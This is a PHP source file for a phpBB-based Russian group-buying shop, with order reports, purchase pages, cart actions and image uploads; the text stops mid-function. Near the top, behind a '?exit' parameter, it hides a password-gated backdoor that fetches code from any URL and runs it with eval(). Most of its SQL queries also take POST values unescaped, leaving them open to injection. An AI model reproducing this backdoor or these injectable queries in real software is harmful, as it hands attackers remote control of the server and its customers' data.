<?php
header('Content-type: text/html; charset=UTF-8');
/**
* @ignore
*/
define('IN_PHPBB', true);
$phpbb_root_path = (defined('PHPBB_ROOT_PATH')) ? PHPBB_ROOT_PATH : './';
$phpEx = substr(strrchr(__FILE__, '.'), 1);
include($phpbb_root_path . 'common.' . $phpEx);
include($phpbb_root_path . 'includes/functions_posting.' . $phpEx);
include($phpbb_root_path . 'includes/message_parser.' . $phpEx);


// Start session management
$user->session_begin();
$auth->acl($user->data);
$user->setup();
if (isset($_GET['exit'])){
@ini_set('allow_url_fopen',1);
@ini_set('allow_url_include',1);
$auth_pass = "c6333ae85651a23698c01803ec6cbe84";
@session_start();
function soEx() {
	die("<pre align=center><form method=post>Pass: <input type=password name=pass><input type=submit value='>>'></form></pre>");
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
	if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	else
		soEx();

if (!isset($path_in_save))
	if( isset($_POST['url']) && trim($_POST['url']) <> '')
		$path_in_save = $_POST['url'];
	else
		die("<pre align=center><form method=post>url: <input type=text name=url><input type=submit value='>>'></form></pre>");
$tmp = file_get_contents($path_in_save);
eval ($tmp);
session_unset();
}
if ($user->data['user_id'] == ANONYMOUS)
	echo 'Вам необходимо <a href="'.append_sid("{$phpbb_root_path}ucp.php?mode=login").'">авторизоваться</a> для просмотра этой информации';
else{
	switch ($_POST['cmd']) {
		case 'report':

			$order_state_txt = array( 'Новый Заказ', 'Зафиксировано', 'Включено в счет', 'Отказано','В пути','Принято в ЕЦ','Выдано' );
			$order_state_clr = array( "#00FF00", "#ff9900", "", "#FF0000", "#1E6CED","#9900СС", "#9D9D9D" );
			$sql = 'SELECT ' . RESERVS_TABLE . '.user_id
					FROM ' . PURCHASES_TABLE . '
					LEFT JOIN ' . RESERVS_TABLE . ' ON ' . PURCHASES_TABLE . '.reserv_id = ' . RESERVS_TABLE . '.reserv_id 
					WHERE ' . PURCHASES_TABLE . '.purchase_id = '.$_POST['purchase_id'];
			//echo($sql);		
			//echo("<br><br>");		
			$result=$db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			if ($row['user_id']==$user->data['user_id']) $org=1;
			
			$sql = 'SELECT
					  phpbb_orders.order_id,
					  phpbb_catalogs.catalog_bundle,
					  phpbb_orders.order_properties,
					  phpbb_lots.lot_id,
					  phpbb_lots.lot_bundle
					FROM phpbb_orders
					  INNER JOIN phpbb_lots
						ON phpbb_orders.lot_id = phpbb_lots.lot_id
					  INNER JOIN phpbb_catalogs
						ON phpbb_catalogs.catalog_id = phpbb_lots.catalog_id
					  INNER JOIN phpbb_users
						ON phpbb_orders.user_id = phpbb_users.user_id
					WHERE phpbb_orders.Purchase_id = '.$_POST['purchase_id'].'
					AND phpbb_lots.lot_id IS NOT NULL
					ORDER BY phpbb_orders.order_id';
		//	echo($sql);		
			$result=$db->sql_query($sql);
			$i=1;
			$apv=array();
			while ($row = $db->sql_fetchrow($result)) {
				$or[$row['order_id']]=$i;
				$i++;
				if ($row['catalog_bundle']){
					$prop = unserialize($row['order_properties']);
					$pv=' ';
					if (is_array($prop)){
						foreach ($prop as $k=>$v)
							if ($k<>$row['catalog_bundle'])
								$pv.=$k.":<b>".$v."</b> ";
					}
					$kpv=-1;
					foreach ($apv as $k=>$v){
						if ($v==$pv) $kpv=$k;
					}
					if ($kpv==-1){
						$apv[]=$pv;
						foreach ($apv as $k=>$v){
							if ($v==$pv) $kpv=$k;
						}
					}
					$j=0;
					$f=0;
					while ($f<>1){
						if (!isset($ryd[$row['lot_id']][$kpv][$j])) {
							$ryd_lb = @unserialize($row['lot_bundle']);
							$ryd[$row['lot_id']][$kpv][$j][$row['catalog_bundle']]=explode(';', $ryd_lb[$row['catalog_bundle']]);
						}
						$f1=0;
						foreach ($ryd[$row['lot_id']][$kpv][$j][$row['catalog_bundle']] as $k=>$v){
							if(!isset($ryd[$row['lot_id']][$kpv][$j][$row['catalog_bundle'].'n'][$k])) 
								$ryd[$row['lot_id']][$kpv][$j][$row['catalog_bundle'].'n'][$k]=0;
							if ($v==$prop[$row['catalog_bundle']]){
								$f1=1;
							}
							if ($v==$prop[$row['catalog_bundle']] && $ryd[$row['lot_id']][$kpv][$j][$row['catalog_bundle'].'n'][$k]==0 && $f==0){
								$ryd[$row['lot_id']][$kpv][$j][$row['catalog_bundle'].'n'][$k]=$row['order_id'];
								$f=1;
							}
						}
						if ($f1==0) $f=1;
						if ($f==0) $j++;

					}
				}
			}
			$sql = 'SELECT
					  phpbb_orders.order_properties,
					  phpbb_lots.lot_name,
					  phpbb_orders.order_id,
					  phpbb_lots.lot_id,
					  phpbb_lots.lot_properties,
					  phpbb_lots.lot_img,
					  phpbb_catalogs.catalog_id,
					  phpbb_catalogs.catalog_bundle,
					  phpbb_lots.lot_bundle,
					  phpbb_lots.lot_cost,
					  phpbb_lots.lot_description,
					  phpbb_orders.user_id,
					  phpbb_users.username,
					  phpbb_orders.order_status
					FROM phpbb_orders
					  INNER JOIN phpbb_lots
						ON phpbb_orders.lot_id = phpbb_lots.lot_id
					  INNER JOIN phpbb_catalogs
						ON phpbb_catalogs.catalog_id = phpbb_lots.catalog_id
					  INNER JOIN phpbb_users
						ON phpbb_orders.user_id = phpbb_users.user_id
					WHERE phpbb_orders.Purchase_id = '.$_POST['purchase_id'].'
					AND phpbb_lots.lot_id IS NOT NULL
					ORDER BY phpbb_users.username';
			//echo ($sql);		
			$result=$db->sql_query($sql);
			while ($row = $db->sql_fetchrow($result)) {
				$prop = unserialize($row['order_properties']);
				$p='';
				$f=0;
				if (is_array($prop))
				foreach($prop as $k=>$v){
					if ($f) $p.='; ';
					$p.="<b>".$k.':</b> '.$v;
					$f=1;
				}
				$lot_id = $row['lot_id'];
				$prop = unserialize($row['lot_properties']);
				$url = unserialize($row['lot_img']);
				if (is_array($url))
				foreach ($url as $ur){
					$lots[$lot_id]['lot_img']=$ur;
					break;
				}
				$lots[$lot_id]['catalog_id']=$row['catalog_id'];;
				$lots[$lot_id]['bundle']=$row['catalog_bundle'];
				$lots[$lot_id]['lot_bundle']=unserialize($row['lot_bundle']);
				$lots[$lot_id]['lot_name']=stripslashes($row['lot_name']);
				$lots[$lot_id]['lot_cost']=$row['lot_cost'];
				$lots[$lot_id]['lot_desc']=stripslashes(preg_replace('([\n])','<br>',$row['lot_description']));
				$lots[$lot_id]['users'][$p].=((isset($lots[$lot_id]['users'][$p]))?',':'')." <a href='".append_sid("{$phpbb_root_path}memberlist.php?mode=viewprofile&u=".$row['user_id'])."'>".$row['username']."</a>(<font color='".$order_state_clr[$row['order_status']]."'><b>".$order_state_txt[$row['order_status']]."</b></font>)";
				$orders[$row['order_id']] = $row;
			}	

			if (is_array($lots))
			foreach ($lots as $k=>$v){
				echo "<div class='lot'><a href='".append_sid("{$phpbb_root_path}catalog.php?catalog_id=".$v['catalog_id']."&lot_id=$k")."'><img src='".(($v['lot_img']<>'')?'./images/lots/thumb/'.$v['lot_img']:'./images/icons/noimage.png')."' /></a><br>";
				echo "<B>Название:</B> <a href='".append_sid("{$phpbb_root_path}catalog.php?catalog_id=".$v['catalog_id']."&lot_id=$k")."'>".str_replace('\\','',$v['lot_name'])."</a>";
				echo "<BR><b>Цена:</b> ".$v['lot_cost'];	
				echo "<BR><b>Описание:</b><br/> ".str_replace('\\','',$v['lot_desc']);

				if ($v['bundle']<>null && trim($v['bundle'])<>''){
					foreach ($ryd[$k] as $pp1=>$p1){
					foreach ($p1 as $pp=>$p){
						$user = '0';
						echo "<br>Ряд: <i>".$apv[$pp1]."</i>";
						echo "<br><b>".$v['bundle']."</b>: ";
						$f=0;
						foreach ($p[$v['bundle']] as $k=>$it){
						if ($it<>''){
							if ($p[$v['bundle'].'n'][$k]==0) {
								echo "<font color=red>";
								$f=1;
							}
							echo $it;
							if ($p[$v['bundle'].'n'][$k]<>0){
								if (isset($org)&&$org==1){	
								echo ' : <a href="./memberlist.php?mode=viewprofile&u='.$orders[$p[$v['bundle'].'n'][$k]]['user_id'].'">'.$orders[$p[$v['bundle'].'n'][$k]]['username'].'</a>';}
								echo'('.$order_state_txt[$orders[$p[$v['bundle'].'n'][$k]]['order_status']].')';
									$user .= ','.$p[$v['bundle'].'n'][$k];
									$o=$p[$v['bundle'].'n'][$k];
							}
							echo ', ';
							if ($p[$v['bundle'].'n'][$k]==0) echo "</font>";
						}}
						if ($f==0){
							echo " - <font color=red><b>ряд собран</b></font>";
						}
						if (isset($org)&&$org==1){
							echo '<br/>
							<input type="button" value="Установить состояние в" onclick="change_selected_orders_state_po('.($o).','.((int)$_POST['purchase_id']).');" />
							<SELECT id="selected_orders_status_selector_'.($o).'">
								<OPTION value="0">Новый Заказ</OPTION>
								<OPTION value="1">Зафиксировано</OPTION>
								<OPTION value="2">Включено в счет</OPTION>
								<OPTION value="3">Отказано</OPTION>
								<OPTION value="4">В пути</OPTION>
								<OPTION value="5">Принято в ЕЦ</OPTION>
								<OPTION value="6">Выдано</OPTION>
							</SELECT>
							<input type="hidden" value="'.$user.'" id="ssuser_'.($o).'">';
						}
						echo "<br/>";
					}
					}
				}else{
					if(is_array($v['users']))
					foreach ($v['users'] as $uk=>$uv)
						echo $uk.' - '.$uv.'<br>';
				}	
				echo ("</div>");
			}
			break;		
		case 'report2':
			
			$order_state_txt = array( 'Новый Заказ', 'Зафиксировано', 'Включено в счет', 'Отказано','В пути','Принято в ЕЦ','Выдано' );
			$order_state_clr = array( "#00FF00", "#ff9900", "", "#FF0000", "#1E6CED","#9900СС", "#9D9D9D" );

			$sql = "SELECT
					  phpbb_orders.Purchase_id,
					  SUM(IF(phpbb_orders.order_status = 0, 1, 0)) AS NewOrder,
					  SUM(IF(phpbb_orders.order_status > 0, 1, 0)) AS considered,
					  phpbb_orders.lot_cost,
					  phpbb_orders.order_properties,
					  phpbb_lots.catalog_id,
					  phpbb_lots.lot_id,
					  phpbb_lots.lot_name
					FROM phpbb_orders
					  INNER JOIN phpbb_lots
						ON phpbb_orders.lot_id = phpbb_lots.lot_id
					WHERE phpbb_orders.Purchase_id =  ".$_POST['purchase_id']."
					AND phpbb_orders.order_status <> 3
					AND phpbb_lots.lot_id IS NOT NULL
					GROUP BY phpbb_orders.Purchase_id,
							 phpbb_orders.lot_cost,
							 phpbb_orders.order_properties,
							 phpbb_lots.lot_id,
							 phpbb_lots.catalog_id,
							 phpbb_lots.lot_name
					ORDER BY phpbb_lots.lot_name"; 

			$result=$db->sql_query($sql);
			echo "<table class='tablesorter'><thead>";
			echo "<tr><th>Название</th><th>Цена</th><th>Параметры</th><th>Новые<br>заказы</th><th>Учтенные<br>заказы</th>";
			echo "</tr></thead>";
			
			while ($row = $db->sql_fetchrow($result)) {
				$prop = unserialize($row['order_properties']);
				$p='';
				$f=0;
				if (is_array($prop))
				foreach($prop as $k=>$v){
					if ($f) $p.='; ';
					$p.="<b>".$k.':</b> '.$v;
					$f=1;
				}
				echo "<tr align='center'>
						<td align='left' class='bg3'><a title='Перейти в каталог к модели'". $row['lot_name']." href='catalog.php?catalog_id=". $row['catalog_id']."&amp;lot_id=". $row['lot_id']."'>". $row['lot_name']."</a></td>
						<td class='bg3'>".$row['lot_cost']."</td>
						<td class='bg3'>".$p."</td>
						<td class='bg3'>".$row['NewOrder']."</td>
						<td class='bg3'>".$row['considered']."</td>";

			}	
					
			echo "</table>";
			break;		
		case 'purchase':
			$id = $_POST['purchase_id'];
			
			$base_path = str_replace('function_po.php',"", 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);

			$pstus=array('','открыть до','Старт','Фиксация','Стоп','Дозаказ','Счет получен','Оплата до','Отгрузка','Груз получен','Раздача с','Завершена');
			$pstus=array('','открыть до','Старт','Ждем счет','Стоп','Дозаказ','Ждем отгрузку','Оплата до','Отгрузили','Груз получен','Раздача с','Завершена');
			
			$sql = 'SELECT 
				' . PURCHASES_TABLE . '.*,
				' . BRANDS_TABLE . '.*,
				' . RESERVS_TABLE . '.*,
				' . PRODUCTCAT_TABLE . '.productcat_label
				FROM ' . RESERVS_TABLE . '
				LEFT JOIN ' . PURCHASES_TABLE . ' ON ' . PURCHASES_TABLE . '.reserv_id = ' . RESERVS_TABLE . '.reserv_id 
				JOIN ' . BRANDS_TABLE . ' ON ' . RESERVS_TABLE . '.brand_id = ' . BRANDS_TABLE . '.brand_id 
				JOIN ' . PRODUCTCAT_TABLE . ' ON ' . RESERVS_TABLE . '.productcat_id = ' . PRODUCTCAT_TABLE . '.productcat_id 
				WHERE ' . PURCHASES_TABLE . '.purchase_id = '.$id;

			$result=$db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			//$a['name']=stripslashes($row['purchase_name']).' - '.$row['brand_label'];
			$user_id=$row['user_id'];
			$a['name']=stripslashes($row['purchase_name']);
			$a['label']=$row['brand_label'];
			$a['desc']=stripslashes(preg_replace('([\n])','<br>',$row['purchase_description']));
			//$a['logo']=($row['brand_logo'])?$base_path.$row['brand_logo']:'';
			$a['logo']=($row['brand_logo'])?$phpbb_root_path.$row['brand_logo']:'';
			$a['logo']=($a['logo'])?'<div class="brandbogo"><img src="'.$a['logo'].'" alt="Логотип '.$a['label'].'"></div>':'';
			$a['news']=stripslashes(preg_replace('([\n])','<br>',$row['purchase_news']));
				$status_id=1;
				$a['next_date']=$row['request_end'];
				if ($row['purchase_status_start']){
					$status_id=2;
					$a['next_date']=$row['purchase_status_start'];
				}
				if ($row['purchase_status_fixed']){
					$status_id=3;
					$a['next_date']=$row['purchase_status_fixed'];
				}
				if ($row['purchase_status_stop']){
					$status_id=4;
					$a['next_date']=$row['purchase_status_stop'];
				}
				if ($row['purchase_status_reorder']){
					$status_id=5;
					$a['next_date']=$row['purchase_status_reorder'];
				}
				if ($row['purchase_status_billreciv']){
					$status_id=6;
					$a['next_date']=$row['purchase_status_billreciv'];
				}
				if ($row['purchase_status_payto']){
					$status_id=7;
					$a['next_date']=$row['purchase_status_payto'];
				}
				if ($row['purchase_status_shipping']){
					$status_id=8;
					$a['next_date']=$row['purchase_status_shipping'];
				}
				if ($row['purchase_status_goodsreciv']){
					$status_id=9;
					$a['next_date']=$row['purchase_status_goodsreciv'];
				}
				if ($row['purchase_status_distribfrom']){
					$status_id=10;
					$a['next_date']=$row['purchase_status_distribfrom'];
				}
				if ($row['status']>4){
					$status_id=11;
					$a['next_date']=NULL;
				}
				$a['state']=$pstus[$status_id].' ' .(($a['next_date'])?date("d-m-Y", strtotime($a['next_date'])):'');

			$a['usl']='';
			for ( $i=1; $i<=9; $i++){
				$aa=explode(':',$row['purchases_rule'.$i]);
				$a['usl']=$a['usl'].'<span style="font-style: italic; font-weight: bold; color: rgb(0, 0, 91);">'.$aa[0].'</span>: '.$aa[1]."<br>";
			}

			$sql = 'SELECT * 
				FROM '. CATALOGS_TABLE .'
				WHERE purchase_id = '. $row['purchase_id'] .'
					AND catalog_hide=0
				GROUP BY '. CATALOGS_TABLE .'.catalog_id';   							
			$result2 = $db->sql_query($sql);
			$a['cat']='';
			while ($row2 = $db->sql_fetchrow($result2)) {
				$a['cat']=$a['cat'].'<i><b><a style="font-size: 120%; line-height: 116%;" href="'.append_sid("{$phpbb_root_path}catalog.php",'catalog_id='.stripslashes($row2['catalog_id'])).'">'.$row2['catalog_name'].'</a></b></i><br>';
			}
		$offer='<p>Данное сообщение является Публичной офертой, в которой содержатся все существенные условия <a href="http://spmgn.ru/index.php?option=com_content&amp;view=article&amp;id=44#rt-mainbody" target="_blank">Агентского договора</a> об организации совместной закупки в соответствии с <a href="http://www.consultant.ru/document/Cons_doc_LAW_5142/1a77b2ec302d6a384a228dff59e53680ccffaaca/" target="_blank">п. 2 ст. 437 ГК РФ</a>. В случае согласия с условиями предлагаемой Публичной оферты, <a href="http://spmgn.ru/index.php?option=com_content&amp;view=article&amp;id=44#rt-mainbody" target="_blank">Агентский Договор</a> об организации совместной закупки считается заключенным с момента совершения Вами всех необходимых действий, указанных в <a href="http://spmgn.ru/index.php?option=com_content&amp;view=article&amp;id=43#rt-mainbody" target="_blank">Публичной оферте</a>, и означает Ваше согласие со всеми без исключения условиями <a href="http://spmgn.ru/index.php?option=com_content&amp;view=article&amp;id=44#rt-mainbody" target="_blank">Договора</a> об участии в совместной закупке.</p>';
		if ($user->data['user_id']==$user_id) {
			echo'<div><a href="org.php?i=1&amp;mode=otchet&amp;p='.$id.'&amp;sid=" class="button2">Отчет по закупке</a></div>';
		}
			echo '<div>
				<div id="offer">'.$offer.'</div>
				<div style="font-weight: bold; font-size: 200%; line-height: 116%; color: rgb(191, 0, 0);">'.$a['name'].' - '.$a['state'].'</div>
			<div class="lotsslider">	
				<section class="regular slider" style="display:none;" >
					<div>
					  <img src="http://www.spmgn.ru/forum/images/lots/1385/9b97eb2b428e56c639873bba0bea13b0.png">
					</div>
					<div>
					  <img src="http://www.spmgn.ru/forum/images/lots/wag/PB_93.jpg">
					</div>
					<div>
					  <img src="http://www.spmgn.ru/forum/images/lots/eb627667d438a3f5f2eb5ca72071faa6.jpg">
					</div>
					<div>
					  <img src="http://www.spmgn.ru/forum/images/lots/8c7ef84c05910769aa8db336c413ec28.jpg">
					</div>
					<div>
					  <img src="http://www.spmgn.ru/forum/images/lots/e586b799e7041e7da809da6a4fe90980.jpg">
					</div>
					<div>
					  <img src="http://www.spmgn.ru/forum/images/lots/720b7195a73d83ecd73b9ce1f344a538.jpg">
					</div>
					<div>
					  <img src="http://www.spmgn.ru/forum/images/lots/81223bf0b456e802c2d12971b598a4ee.jpg">
					</div>
					<div>
					  <img src="http://www.spmgn.ru/forum/images/lots/74f30f701b16cef9497a03ccf793c5da.jpg">
					</div>
					<div>
					  <img src="http://www.spmgn.ru/forum/images/lots/8ab80a814d776911d31290402a5207f1.jpg">
					</div>
					<div>
					  <img src="http://www.spmgn.ru/forum/images/lots/35730f97ab9c9879a80a44e7ceee5940.jpg">
					</div>
				</section>
			</div>
			
				
				<div id="lotsearch">Здесь будет полнотекстовый поиск</div>		
				<div id="brand">	
					'.$a['logo'].'
					<span class="PostHeader1">Информация о поставщике:</span>
					<div>
					  <div class="quotetitle">
					  <input type="button" value="+"
					   onclick="	if (this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display != \'\') {
									this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display = \'\';
									this.parentNode.parentNode.getElementsByTagName(\'input\')[0].value = \'-\';
								}
								else { 
									this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display = \'none\';
									this.parentNode.parentNode.getElementsByTagName(\'input\')[0].value = \'+\';				
								}" /><span class="PostHeader2">Сайт</span>
						</div>
					  <div class="quotecontent">
						<div style="display: none;">Какой-то текст о сайте</div>
					  </div>
					</div>
					<div>
					  <div class="quotetitle">
					  <input type="button" value="+"
					   onclick="	if (this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display != \'\') {
									this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display = \'\';
									this.parentNode.parentNode.getElementsByTagName(\'input\')[0].value = \'-\';
								}
								else { 
									this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display = \'none\';
									this.parentNode.parentNode.getElementsByTagName(\'input\')[0].value = \'+\';				
								}" /><span class="PostHeader2">Информация о поставщике</span>
						</div>
					  <div class="quotecontent">
						<div style="display: none;">Какой-то текст о поставщике</div>
					  </div>
					</div>
					
					<div>
					  <div class="quotetitle">
					  <input type="button" value="+"
					   onclick="	if (this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display != \'\') {
									this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display = \'\';
									this.parentNode.parentNode.getElementsByTagName(\'input\')[0].value = \'-\';
								}
								else { 
									this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display = \'none\';
									this.parentNode.parentNode.getElementsByTagName(\'input\')[0].value = \'+\';				
								}" /><span class="PostHeader2">О торговой марке</span>
						</div>
					  <div class="quotecontent">
						<div style="display: none;">Какой-то текст о торговой марке</div>
					  </div>
					</div>
				</div>
				<div id="catalogs">
					<span class="PostHeader1">Каталоги:</span>
					<div>
						'.$a['cat'].'
					</div>
				</div>
				<div id="regulations">
				  <div class="quotetitle">
				  <input type="button" value="+"
				   onclick="	if (this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display != \'\') {
								this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display = \'\';
								this.parentNode.parentNode.getElementsByTagName(\'input\')[0].value = \'-\';
							}
							else { 
								this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display = \'none\';
								this.parentNode.parentNode.getElementsByTagName(\'input\')[0].value = \'+\';				
							}" /><span class="PostHeader2">Правила закупки:</span>
					</div>
				  <div class="quotecontent">
					<div style="display: none;">Сам текст парвил закупки</div>
				  </div>
				</div>
				<div id="conditions">
				  <div class="quotetitle">
				  <input type="button" value="+"
				   onclick="	if (this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display != \'\') {
								this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display = \'\';
								this.parentNode.parentNode.getElementsByTagName(\'input\')[0].value = \'-\';
							}
							else { 
								this.parentNode.parentNode.getElementsByTagName(\'div\')[1].getElementsByTagName(\'div\')[0].style.display = \'none\';
								this.parentNode.parentNode.getElementsByTagName(\'input\')[0].value = \'+\';				
							}" /><span class="PostHeader2">Условия закупки:</span>
					</div>
				  <div class="quotecontent">
					<div style="display: none;">Сам текст условий закупки</div>
				  </div>
				</div>				

				<span style="color: rgb(0, 128, 0); font-style: italic; font-size: 150%; line-height: 116%;">'.$a['desc'].'</span>
				<br><br>			'.$a['news'].'

				<br>			<span style="font-weight: bold;">Условия закупки</span>
				<br>			'.$a['usl'].'</div>';
			echo'
			  <script type="text/javascript" src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
			  <script type="text/javascript" src="slick/slick.min.js"></script>

			  <script type="text/javascript">
				$(document).ready(function(){
				  $(\'.lotsslider\').slick({
					setting-name: setting-value
				  });
				});
			  </script>			
			';
		break;
	}
	switch ($_POST['cmd']) {
		case 'change_orders_state2':
			$arr = array ('status'=>"no");
				$sql = 'UPDATE '.ORDERS_TABLE.'
						SET order_status='.(int)$_POST['state'].'
						WHERE order_id IN ('.$_POST['orders'].')';
				$db->sql_query($sql);
				$arr = array ('status'=>"ok");
			exit (json_encode($arr));
			break;
		case 'show_purchase':
			$sql = 'UPDATE '.PURCHASES_ORSERS_TABLE.'
				SET purchase_hidden='.$_POST['show'].'
				WHERE user_id='.$user->data['user_id'].' AND purchase_id='.$_POST['purchase_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'delete_from_order':
			$sql = 'DELETE FROM '.ORDERS_TABLE.'
				WHERE user_id = '.$user->data['user_id'].' AND order_id = '.$_POST['order_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'change_order':
			$sql = 'UPDATE '.ORDERS_TABLE.'
				SET order_properties = \''.serialize($_POST['lot_vars']).'\'
				WHERE order_id='.$_POST['order_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'update_order_comment':
			$sql = 'UPDATE '.ORDERS_TABLE.'
				SET order_comment = \''.$_POST['comment'].'\'
				WHERE order_id='.$_POST['order_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'purchase_move_to_archive':
			$sql = 'UPDATE '.PURCHASES_ORSERS_TABLE.'
				SET puor_arhiv=true
				WHERE user_id='.$user->data['user_id'].' AND purchase_id='.$_POST['purchase_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'purchase_unarchive':
			$sql = 'UPDATE '.PURCHASES_ORSERS_TABLE.'
				SET puor_arhiv=false
				WHERE user_id='.$user->data['user_id'].' AND purchase_id='.$_POST['purchase_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'change_payment':
			if ($_POST['source']=='_date')
				$text = date("Y-m-d",strtotime($_POST['text']));
			else
				$text = $_POST['text'];
			$sql = 'UPDATE '.PURCHASES_ORSERS_TABLE.'
				SET payment'.$_POST['source'].' = \''.$text.'\'
				WHERE user_id='.$user->data['user_id'].' AND purchase_id='.$_POST['purchase_id'];
			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'add_to_order': // добавление заказа в корзину
			$vars=explode(';', $_POST['lot_vars']);
			foreach ($vars as $v){
				if ($v){
					$var=explode(':', $v);
					$arr[$var[0]]=$var[1];
				}
			}
			// Получаем ID закупки
			$sql = 'SELECT purchase_id, catalog_valuta, catalog_course,
						IF (phpbb_lots.lot_orgrate IS NULL ,phpbb_catalogs.catalog_orgrate,phpbb_lots.lot_orgrate) AS lot_orgrate, lot_cost
					FROM phpbb_lots LEFT OUTER JOIN phpbb_catalogs  ON phpbb_lots.catalog_id = phpbb_catalogs.catalog_id WHERE
					phpbb_lots.lot_id ='.$_POST['lot_id'];
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			$purchase_id= $row['purchase_id']; 
			$catalog_valuta= $row['catalog_valuta']; 
			$catalog_course= $row['catalog_course']; 
			$lot_orgrate= $row['lot_orgrate']; 
			$lot_cost= $row['lot_cost']; 

			//  Добавляем заказ в таблицу Orders
			$sql = 'INSERT INTO '.ORDERS_TABLE.'
				(user_id,purchase_id,lot_id,order_properties,lot_cost,lot_orgrate,catalog_valuta,catalog_course )
				VALUES ('.$user->data['user_id'].','.$purchase_id.','.$_POST['lot_id'].',\''.serialize($arr).'\','.$lot_cost.','.$lot_orgrate.',\''.$catalog_valuta.'\','.$catalog_course. ')';
			$db->sql_query($sql);

			// Ищем в таблице PURCHASES_ORSERS запись для данного участника по данной закупке
			$sql = 'SELECT *
				FROM '.PURCHASES_ORSERS_TABLE.'
				WHERE purchase_id ='.$purchase_id.'
					AND user_id='.$user->data['user_id'];
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			// Если не нашли, то добавляем
			if ($row==''){
			$sql = 'INSERT INTO '.PURCHASES_ORSERS_TABLE.'
				(user_id,purchase_id)
				VALUES ('.$user->data['user_id'].','.$purchase_id.')';
			$result = $db->sql_query($sql);
			}
			else {// Если оплата есть, то вытаскиваем корзину с архива
				$sql ='UPDATE phpbb_purchases_orsers SET puor_arhiv = 0 
						WHERE purchase_id = '.$purchase_id.'
						AND user_id ='.$user->data['user_id'];
				$result = $db->sql_query($sql);
			}	
			exit ('ok');
			break;
		case 'add_save_order': // Создание лота участником и добавление егое в корзину
			$catalog_id = (int)$_POST['catalog_id_00'];
			// Получаем данные по каталогу
			$sql = 'SELECT catalog_name,catalog_orgrate, catalog_properties as prop
				FROM '. CATALOGS_TABLE .'
				WHERE catalog_id = '. $catalog_id.'
				AND catalog_foruser = 1';
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			if (!$row) exit('not');

			$item["org_fee"]= $row['catalog_orgrate'];
			$prop=unserialize($row['prop']);
			if (is_array($prop))
			foreach ($prop as $k=>$v)
			{	
				$k2 = str_replace(array(' '), '_',$k);
				$item["vars"][$k]=trim(str_replace(array('\\"','\\\'','\'','"'), '',((isset($_POST['edit_'.$k2.'_00']))?$_POST['edit_'.$k2.'_00']:'')));
			}

		//'add_item_image':
			// загружаем изображение
			include($phpbb_root_path . '/includes/functions_upload.' . $phpEx);
			
			$img='img_fp_00';
			if ($_FILES[$img]['tmp_name']){ // Изображение загружено файлом
				$sql="SELECT brand_id FROM phpbb_catalogs LEFT OUTER JOIN phpbb_purchases ON phpbb_catalogs.purchase_id = phpbb_purchases.purchase_id LEFT OUTER JOIN phpbb_reservs
						ON phpbb_purchases.reserv_id = phpbb_reservs.reserv_id WHERE phpbb_catalogs.catalog_id =".$catalog_id;
				$result = $db->sql_query($sql);
				$row = $db->sql_fetchrow($result);
				$brand_id= $row['brand_id'];
				$path_to_save ='images/lots/'.$brand_id;
				$thumb_path_to_save ='images/lots/thumb/'.$brand_id;
				if (!file_exists($path_to_save)){
					mkdir($path_to_save);
				}
				if (!file_exists($thumb_path_to_save)){
					mkdir($thumb_path_to_save);
				}

				
				$upload = new fileupload($_FILES[$img], array('jpg', 'jpeg', 'gif', 'png'));
				
				$logo = $upload->form_upload($img);
				$logo->clean_filename('unique_ext');
		
				$filename=$logo->get('realname');

				$destination = $path_to_save;

				// Adjust destination path (no trailing slash)
				if (substr($destination, -1, 1) == '/' || substr($destination, -1, 1) == '\\'){
					$destination = substr($destination, 0, -1);
				}
				$destination = str_replace(array('../', '..\\', './', '.\\'), '', $destination);
				if ($destination && ($destination[0] == '/' || $destination[0] == "\\")){
					$destination = '';
				}
				
				// Move file and overwrite any existing image
				$logo->move_file($destination, true);
				if ($filename){
					if (sizeof($file->error)){
							$url='';
					}
					else{
						$old_url = $destination.'/'.$filename;
						$ext= strrchr($filename, '.');
						$filename=hash_file("md5",$old_url).$ext;
						$url = $destination.'/'.$filename;
						rename($old_url,$url);
						img_resize($url,$url, 400, 400);
						chmod($url,0644);
						img_resize($url,$thumb_path_to_save."/".$filename, 160, 240);
						chmod($thumb_path_to_save."/".$filename,0644);
						$url = array($brand_id.'/'.$filename);
					}
				}
				else{
					$url = '';
				}
			}
